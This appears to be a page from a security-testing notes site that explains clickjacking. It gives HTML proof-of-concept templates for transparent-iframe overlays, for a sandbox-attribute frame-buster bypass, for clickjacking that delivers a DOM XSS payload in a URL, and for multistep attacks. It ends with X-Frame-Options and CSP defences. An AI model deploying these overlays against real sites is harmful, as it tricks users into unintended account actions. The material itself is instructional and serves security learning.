---
title: Clickjacking
category: Web
order: 19
---

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.


# Basic clickjacking attack

You can manually create a clickjacking proof of concept.

```html
<head>
	<style>
		.target_website {
			position:relative;
			width:900px;
			height:700px;
			opacity:0.00001;
			z-index:2;
			}
		.decoy_website {
			position:absolute;
			top:300px;
			left:400px;
			z-index:1;
			}
	</style>
</head>

<body>
	<div class="decoy_website">
	...decoy web content here...
	</div>
	<iframe class="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

![](/hackingnotes/images/clickjacking.png)

> **Note**: Use `opacity: 0.1` in order to set propperly the `decoy website` into a real button. Finally change it to `opacity:0.000001`.

Or alternativelly you can use `Burp Clickbandit` tool.

![](/hackingnotes/images/clickbandit.png)


# Frame busting scripts

Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. 

An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window: 

```html
<style>
    iframe {
        position:relative;
        width:900px;
        height:700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://example.com/my-account?email=test@test.com" sandbox="allow-forms"></iframe>
```

# Combining clickjacking with a DOM XSS attack

The true potency of clickjacking is revealed when it is used as a carrier for another attack such as a DOM XSS attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack. 


```html
<style>
    iframe {
        position:relative;
        width:900px;
        height:1200px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:795px;
        left:80px;
        z-index: 1;
opacity: 1;
    }
</style>
<div>click me</div>
<iframe src="https://example.com/feedback?name=%3Cimg%20src=x%20onerror=alert(1)%3E&email=test@test.com&subject=test&message=test" ></iframe>
```

# Multistep clickjacking

Attacker manipulation of inputs to a target website may necessitate multiple actions. 

```html
<style>
	.target_website {
		position:relative;
		width:900px;
		height:700px;
		opacity:0.1;
		z-index:2;
		}
	.decoy_website_1 {
		position:absolute;
		top:525px;
		left:50px;
		z-index:1;
		}
	.decoy_website_2 {
		position:absolute;
		top:290px;
		left:200px;
		z-index:1;
		}
</style>
<div class="decoy_website_1">Click me first</div>
<div class="decoy_website_2">Click me next</div>
<iframe class="target_website"  src="https://example.com/my-account"></iframe>
```

# Preventing clickjacking

There are two mechanisms for server-side clickjacking protection, `X-Frame-Options` and `Content Security Policy`.

* More restrictive:

```
X-Frame-Options: deny
Content-Security-Policy: frame-ancestors 'none';
```

* Less restrictive:

```
X-Frame-Options: sameorigin
Content-Security-Policy: frame-ancestors 'self';
```